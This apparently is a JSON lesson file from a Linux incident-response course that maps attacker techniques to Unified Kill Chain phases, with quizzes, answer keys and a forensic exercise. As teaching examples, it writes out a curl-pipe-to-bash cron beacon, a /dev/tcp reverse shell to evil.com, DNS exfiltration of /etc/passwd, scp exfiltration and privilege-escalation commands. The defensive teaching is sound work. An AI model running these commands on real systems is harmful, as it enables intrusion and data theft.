@@ -1,0 +1,118 @@
+{
+  "lesson_id": "c3d4e5f6-7a8b-9c0d-1e2f-3a4b5c6d7e8f",
+  "domain": "dfir",
+  "title": "Linux Cyber Attacks and the Unified Kill Chain",
+  "difficulty": 2,
+  "order_index": 247,
+  "prerequisites": ["Linux Incident Response Fundamentals"],
+  "concepts": ["Unified Kill Chain framework", "Linux-specific attack techniques", "Attack patterns in Linux environments", "Adversary tactics on Linux systems", "Kill chain analysis methodology", "MITRE ATT&CK mapping for Linux", "Common Linux attack vectors", "Lateral movement in Linux environments"],
+  "estimated_time": 50,
+  "learning_objectives": ["Explain the Unified Kill Chain and how it extends beyond the Cyber Kill Chain", "Map Linux-specific attacks to each kill chain phase", "Identify common Linux attack patterns including privilege escalation and persistence", "Correlate attack artifacts across kill chain phases for investigation", "Apply MITRE ATT&CK framework to Linux incidents"],
+  "post_assessment": [
+    {
+      "question_id": "linux-kc-001",
+      "question": "How does the Unified Kill Chain (UKC) improve upon the traditional Cyber Kill Chain?",
+      "options": ["It adds more technical details about malware", "It incorporates multiple attack loops, feedback cycles, and covers the full attack lifecycle including post-compromise", "It only applies to nation-state attacks", "It replaces MITRE ATT&CK entirely"],
+      "correct_answer": 1,
+      "explanation": "The UKC extends Lockheed Martin's Cyber Kill Chain by recognizing that attacks aren't linear — they involve loops, pivots, and feedback cycles. It covers the complete attack lifecycle from reconnaissance through impact and includes post-compromise activities like lateral movement and data exfiltration that the original kill chain treated as a single 'actions on objectives' phase.",
+      "type": "multiple_choice",
+      "difficulty": 2
+    },
+    {
+      "question_id": "linux-kc-002",
+      "question": "On a Linux system, which of the following is the MOST common initial access vector?",
+      "options": ["USB device insertion", "Exploited public-facing application (web server, API)", "Physical access to the console", "Bluetooth exploit"],
+      "correct_answer": 1,
+      "explanation": "Linux servers primarily face the internet through web applications, APIs, and services like SSH. Exploiting public-facing applications (web servers, CMS, APIs) and brute-forcing SSH credentials are the top two initial access vectors for Linux, according to Verizon DBIR data. Physical access and USB attacks are rare for server infrastructure.",
+      "type": "multiple_choice",
+      "difficulty": 1
+    },
+    {
+      "question_id": "linux-kc-003",
+      "question": "An attacker gains access to a Linux web server via a vulnerable web application, then uses `sudo` misconfiguration to escalate to root. Which kill chain phases does this represent?",
+      "options": ["Initial access only", "Initial access and privilege escalation", "Persistence and lateral movement", "Reconnaissance and weaponization"],
+      "correct_answer": 1,
+      "explanation": "The web application exploitation represents the Initial Access phase (entering the target environment). The sudo misconfiguration exploitation represents Privilege Escalation (gaining higher permissions). These are distinct phases — the attacker first got a foothold, then elevated their access.",
+      "type": "multiple_choice",
+      "difficulty": 2
+    },
+    {
+      "question_id": "linux-kc-004",
+      "question": "Which Linux persistence mechanism allows an attacker to maintain access across reboots by modifying a user's shell configuration?",
+      "options": ["Adding a cron job in /etc/cron.d/", "Appending commands to ~/.bashrc or ~/.zshrc", "Installing a kernel module", "Creating a new systemd service"],
+      "correct_answer": 1,
+      "explanation": "Appending commands to ~/.bashrc or ~/.zshrc executes attacker code every time the user logs in. This is a user-level persistence mechanism that survives reboots and is harder to detect than system-level mechanisms like cron jobs or systemd services because shell configs are frequently modified by legitimate users.",
+      "type": "multiple_choice",
+      "difficulty": 2
+    },
+    {
+      "question_id": "linux-kc-005",
+      "question": "During investigation, you find SSH keys in /root/.ssh/authorized_keys that don't belong to any known administrator, and a cron job running `curl http://evil.com/shell.sh | bash` every 5 minutes. Which kill chain phases are represented?",
+      "options": ["Persistence and command and control", "Lateral movement and exfiltration", "Reconnaissance and weaponization", "Initial access and privilege escalation"],
+      "correct_answer": 0,
+      "explanation": "The unauthorized SSH key represents Persistence (maintaining access across sessions). The cron job that downloads and executes a script every 5 minutes represents Command and Control (establishing recurring communication with attacker infrastructure). Both are post-compromise techniques for maintaining the attacker's presence.",
+      "type": "multiple_choice",
+      "difficulty": 2
+    }
+  ],
+  "jim_kwik_principles": ["active_learning", "minimum_effective_dose", "teach_like_im_10", "memory_hooks", "meta_learning", "connect_to_what_i_know", "multiple_memory_pathways", "reframe_limiting_beliefs", "gamify_it", "learning_sprint"],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "content": {
+        "text": "# Understanding the Attack: Think Like the Adversary 🎯\n\nYou can't defend what you don't understand. And you can't investigate what you can't trace.\n\nThe Unified Kill Chain gives you a **mental map** of how attacks unfold on Linux systems. Once you understand the phases, you'll start seeing patterns in every incident:\n\n- \"This SSH key? That's persistence.\"\n- \"This web shell? That's initial access.\"\n- \"This sudo misconfiguration? That's privilege escalation.\"\n\n**Why this matters:** When you respond to an incident, you don't just find artifacts — you place them in the attack timeline. The kill chain is that timeline.\n\nThis lesson connects the theory of attack methodology with the practical reality of Linux systems. Let's build your attacker's mindset. 🧠"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "# The Unified Kill Chain Framework\n\n## From Cyber Kill Chain to Unified Kill Chain\n\n### Original Cyber Kill Chain (Lockheed Martin, 2011)\n7 linear phases:\n1. Reconnaissance → 2. Weaponization → 3. Delivery → 4. Exploitation → 5. Installation → 6. C2 → 7. Actions on Objectives\n\n**Problem:** Real attacks aren't linear. Attackers loop back, pivot, and iterate.\n\n### Unified Kill Chain (Paul Pols, 2018)\nExtends the model with:\n- **Feedback loops** — Attackers adapt based on defenses\n- **Multiple attack paths** — Not just one way in\n- **Post-compromise phases** — Detailed lateral movement, collection, exfiltration\n- **Nested chains** — Sub-attacks within the main attack\n\n## UKC Phases for Linux Attacks\n\n| Phase | Linux Technique | Forensic Artifact |\n|-------|----------------|-------------------|\n| **Reconnaissance** | Nmap scans, Shodan queries, GitHub enumeration | Web access logs, DNS logs |\n| **Weaponization** | Creating payloads for Linux targets (ELF malware, shell scripts) | Attacker infrastructure logs |\n| **Delivery** | Phishing, watering hole, supply chain, SSH brute-force | Auth logs, web logs, email |\n| **Exploitation** | Web app RCE, SSH brute-force success, CVE exploits | Application logs, crash dumps |\n| **Persistence** | SSH keys, cron jobs, systemd services, .bashrc | authorized_keys, /etc/cron*, ~/.bashrc |\n| **Defense Evasion** | Log clearing, rootkits, process hiding | Missing logs, /proc anomalies |\n| **C2** | Reverse shells, beacons, DNS tunneling | Network connections, DNS logs |\n| **Privilege Escalation** | sudo misconfig, SUID binaries, kernel exploits | /var/log/auth.log, sudo logs |\n| **Lateral Movement** | SSH key reuse, SSH tunneling, Ansible abuse | SSH logs, network flows |\n| **Collection** | Data staging in /tmp, archive creation | /tmp analysis, process args |\n| **Exfiltration** | scp, rsync over SSH, DNS exfiltration, cloud sync | NetFlow, DNS logs, bandwidth |\n| **Impact** | Ransomware, data destruction, cryptomining | Encrypted files, high CPU usage |"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "# Linux Attack Patterns by Kill Chain Phase\n\n## Initial Access: Getting In\n\n### 1. SSH Brute-Force\n```bash\n# Evidence in auth.log\nMar 15 02:14:01 server sshd[12345]: Failed password for root from 203.0.113.42\nMar 15 02:14:02 server sshd[12345]: Failed password for root from 203.0.113.42\n# ... thousands of attempts ...\nMar 15 02:17:33 server sshd[12345]: Accepted password for deploy from 203.0.113.42\n```\n\n### 2. Web Application Exploitation\n```bash\n# Evidence in web access logs\n203.0.113.42 - - [15/Mar/2024:02:14:22] \"GET /wp-content/uploads/shell.php HTTP/1.1\" 200\n203.0.113.42 - - [15/Mar/2024:02:14:23] \"POST /wp-content/uploads/shell.php?cmd=id HTTP/1.1\" 200\n```\n\n### 3. Supply Chain Attack\n```bash\n# Evidence in package logs\n2024-03-15 02:14:22 install malicious-package:amd64 <none> 1.0.0\n```\n\n## Persistence: Staying In\n\n### Common Linux Persistence Mechanisms\n```bash\n# 1. SSH authorized_keys\necho 'ssh-rsa AAAA... attacker@evil' >> /root/.ssh/authorized_keys\n\n# 2. Cron job\necho '*/5 * * * * curl http://evil.com/shell.sh | bash' > /etc/cron.d/update\n\n# 3. Systemd service\ncat /etc/systemd/system/monitor.service\n[Unit]\nDescription=System Monitor\n[Service]\nExecStart=/usr/local/bin/.monitor\n\n# 4. Shell profile\necho 'bash -i >& /dev/tcp/evil.com/4444 0>&1 &' >> ~/.bashrc\n\n# 5. LD_PRELOAD persistence\necho '/usr/local/lib/libevil.so' >> /etc/ld.so.preload\n```\n\n## Privilege Escalation: Getting Root\n\n### Top Linux PrivEsc Techniques\n1. **sudo misconfig** — `sudo -l` reveals ALL privileges\n2. **SUID binaries** — Find with `find / -perm -4000 2>/dev/null`\n3. **Kernel exploits** — Check `uname -r` for vulnerable versions\n4. **Cron jobs running as root** — Check `/etc/crontab` for writable scripts\n5. **Docker group membership** — `docker run -v /:/mnt --rm -it alpine chroot /mnt`\n\n## Command and Control: Calling Home\n```bash\n# Reverse shell patterns in process list\nbash -i >& /dev/tcp/evil.com/4444 0>&1\npython -c 'import socket,subprocess,os;...'\ncurl https://evil.com/beacon\n\n# DNS exfiltration\ndig $(hostname).$(cat /etc/passwd | base64).evil.com\n```"
+      }
+    },
+    {
+      "type": "code_exercise",
+      "content": {
+        "text": "# Kill Chain Investigation: Mapping Artifacts to Phases\n\nYou're investigating a compromised Ubuntu web server. Using the evidence below, map each artifact to its kill chain phase:\n\n```bash\n# Evidence file 1: /var/log/auth.log\nMar 14 22:14:01 server sshd[12345]: Failed password for root from 203.0.113.42\nMar 14 22:14:02 server sshd[12345]: Failed password for root from 203.0.113.42\n... (14,000 failed attempts) ...\nMar 14 22:17:33 server sshd[12345]: Accepted password for deploy from 203.0.113.42\nMar 14 22:17:40 server sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash\n\n# Evidence file 2: /root/.ssh/authorized_keys\nssh-rsa AAAAB3NzaC1yc2EAAA... attacker@kali\n\n# Evidence file 3: /etc/cron.d/system-update\n*/5 * * * * root curl -s http://evil.example.com/api/beacon | bash\n\n# Evidence file 4: /var/log/apache2/access.log\n203.0.113.42 - \"POST /api/upload HTTP/1.1\" 200 45\n203.0.113.42 - \"GET /uploads/shell.php HTTP/1.1\" 200\n\n# Evidence file 5: netstat output\ntcp ESTABLISHED 0 0 10.0.0.5:443 203.0.113.42:8080\ntcp ESTABLISHED 0 0 10.0.0.5:54321 185.220.101.34:443\n```\n\n## Task: Map each evidence item to a kill chain phase\n1. Auth.log brute-force attempts → ?\n2. Auth.log successful login → ?\n3. sudo to root → ?\n4. SSH key in authorized_keys → ?\n5. Cron job with curl to evil.com → ?\n6. Web shell upload → ?\n7. Established connection to 185.220.101.34 → ?\n\n## Bonus: Write the complete attack timeline with kill chain phases labeled.",
+        "language": "bash",
+        "solution": "1. Auth.log brute-force → Reconnaissance/Delivery (attempting access)\n2. Auth.log successful login → Initial Access (successfully gained entry)\n3. sudo to root → Privilege Escalation (elevating permissions)\n4. SSH key in authorized_keys → Persistence (maintaining access across sessions)\n5. Cron job → C2 + Persistence (calling home + surviving reboots)\n6. Web shell upload → Initial Access/Exploitation (alternative entry point)\n7. Established C2 connection → Command and Control\n\nTimeline: Web shell (Initial Access) → SSH brute-force (Delivery/Exploitation) → sudo (Privilege Escalation) → SSH key + cron (Persistence + C2) → Active C2 connection"
+      }
+    },
+    {
+      "type": "real_world",
+      "content": {
+        "text": "# Case Study: Voicemail Phishing → Linux Server Compromise\n\n## The Attack (Mapped to UKC)\n\n### Phase 1: Reconnaissance\nThe attacker scanned the company's internet-facing infrastructure:\n```bash\n# Nmap scan detected in firewall logs\n2024-03-10 01:00:00 DROP 203.0.113.42 → 10.0.0.5 TCP:22,80,443,8080\n```\n\n### Phase 2-3: Weaponization & Delivery\nSpear-phishing email targeting the development team with a malicious attachment:\n```\nSubject: Critical: Production Server Hotfix\nAttachment: hotfix.sh (reverse shell payload)\n```\n\n### Phase 4: Exploitation\nDeveloper ran the script on the web server:\n```bash\n# .bash_history\ncd /tmp\nchmod +x hotfix.sh\n./hotfix.sh  # ← This was the reverse shell\n```\n\n### Phase 5: Persistence\nAttacker established multiple persistence mechanisms:\n- SSH key in `/root/.ssh/authorized_keys`\n- Cron job: `*/10 * * * * root /usr/local/bin/.update`\n- Systemd service: `monitoring-daemon.service`\n\n### Phase 6: C2\nDNS beaconing to `api.update-cdn.evil.com` every 10 minutes:\n```bash\n# DNS query log\n10.0.0.5 → api.update-cdn.evil.com A (every 600 seconds)\n```\n\n### Phase 7: Lateral Movement\nSSH from compromised web server to database server:\n```bash\n# Database server auth.log\nMar 15 03:00:22 dbserver sshd[67890]: Accepted publickey for root from 10.0.0.5\n```\n\n### Phase 8: Collection & Exfiltration\nDatabase dump staged in /tmp and exfiltrated via scp:\n```bash\n# Process list on web server\ndbuser 12345 0.1 0.2 mysqldump -u root -p dbname > /tmp/.db_dump.sql\nroot 12346 0.0 0.0 scp /tmp/.db_dump.sql attacker@evil.com:/data/\n```\n\n## Kill Chain Mapping Summary\n\n| Artifact | Phase | Evidence Source |\n|----------|-------|----------------|\n| Firewall logs showing scan | Reconnaissance | Firewall logs |\n| Phishing email | Delivery | Email gateway logs |\n| Script execution | Exploitation | .bash_history, /proc |\n| SSH key + cron + service | Persistence | File system |\n| DNS beaconing | C2 | DNS logs |\n| SSH to DB server | Lateral Movement | Auth logs |\n| mysqldump + scp | Collection + Exfiltration | Process list, netflow |"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "# Teach Me Like I'm 10: The Kill Chain 🏰\n\nImagine a castle being attacked. The attacker has to go through **steps** to conquer it:\n\n1. 🔭 **Scout the castle** — Look at the walls, count the guards, find weaknesses\n2. 🏹 **Make weapons** — Build a ladder, forge a key\n3. 📦 **Deliver the attack** — Sail to the castle, knock on the door\n4. 💥 **Break in** — Climb the wall, pick the lock\n5. 🔑 **Hide a key** — Leave a hidden key so you can come back tomorrow\n6. 🕵️ **Hide your tracks** — Wipe your footprints, wear a disguise\n7. 📡 **Set up communication** — Signal your army that you're inside\n8. ⬆️ **Climb higher** — Get from the kitchen to the king's tower\n9. ↔️ **Move between rooms** — Go from the kitchen to the treasure room\n10. 🎒 **Collect the treasure** — Put gold in bags\n11. 📤 **Send the treasure out** — Throw bags over the wall\n12. 💥 **Make damage** — Burn the castle or mine for gold\n\n**The key insight:** Attackers MUST go through most of these steps. If you can spot them at ANY step, you can stop the whole attack.\n\nFind the hidden key? Remove it and they can't come back. 🗝️\nSee them signaling? Block the signal. 📡\nFind the bags of gold? They haven't left yet — you can still save it! 🎒"
+      }
+    },
+    {
+      "type": "memory_aid",
+      "content": {
+        "text": "# Memory Hooks: Kill Chain Phases 🔗\n\n## UKC Phases: **RWEDPLCLAPEI**\n(Not catchy. Let's try groups:)\n\n### Getting In: **RWD-E**\n**R**econnaissance → **W**eaponization → **D**elivery → **E**xploitation\n(\"Read When Dog Enters\" — the attacker gets in)\n\n### Staying In: **PD-C**\n**P**ersistence → **D**efense Evasion → **C**2\n(\"Please Don't Call\" — they set up camp)\n\n### Moving Up & Out: **LAP-EI**\n**L**ateral Movement → **A**ction on Objectives → **P**rivilege Escalation → **E**xfiltration → **I**mpact\n(\"Look At Performance — Everyone Impacted\")\n\n## Linux Persistence Locations: **SCSLD**\n- **S**SH keys → ~/.ssh/authorized_keys\n- **C**ron → /etc/cron.d/, crontab\n- **S**ystemd → /etc/systemd/system/\n- **L**D_PRELOAD → /etc/ld.so.preload\n- **D**otfiles → ~/.bashrc, ~/.profile\n\n## Investigation Flow: **EAT-CRAB**\n- **E**vidence collection → **A**nalyze → **T**imeline → **C**orrelate → **R**econstruct → **A**ttribute → **B**uild report"
+      }
+    },
+    {
+      "type": "reflection",
+      "content": {
+        "text": "# Check Your Understanding\n\n1. **Map this attack to kill chain phases:** An attacker scans your web server, exploits a vulnerability in your CMS, adds an SSH key, escalates via sudo, pivots to the database, and exfiltrates customer data.\n\n2. **You find these artifacts on a compromised system.** Map each to a kill chain phase:\n   - A cron job downloading from `evil.com` every 5 minutes\n   - Missing entries in `/var/log/auth.log`\n   - An unauthorized Docker container running\n   - A `.swp` file in `/var/www/uploads/`\n\n3. **Why is it important to map the ENTIRE kill chain, not just the initial access?** What would you miss if you only investigated the initial compromise?\n\n4. **How does the Unified Kill Chain handle attack loops?** Give an example of how an attacker might loop back through phases.\n\n5. **You're building a detection strategy.** For which kill chain phase is it MOST cost-effective to invest in detection, and why?"
+      }
+    },
+    {
+      "type": "mindset_coach",
+      "content": {
+        "text": "# You Now See the Full Attack Picture 🎯\n\nThe kill chain is more than a framework — it's your **investigation roadmap.** Every artifact you find fits somewhere in the chain. Every gap in the chain is a question you need to answer.\n\n**Key takeaways:**\n- Real attacks loop, pivot, and iterate — they're not linear\n- Linux-specific techniques differ from Windows but follow the same phases\n- Persistence is where attackers make mistakes — they leave traces\n- C2 communications are the lifeline — cut them and the attack stalls\n\n**Next lesson:** We'll use The Sleuth Kit to examine Linux filesystems at the binary level — finding the artifacts that confirm each kill chain phase.\n\nThe kill chain gives you the map. The filesystem gives you the evidence. Together, they tell the complete story. 🗺️"
+      }
+    }
+  ],
+  "tags": ["Course: SANS-FOR577", "Career Path: DFIR Specialist"]
+}
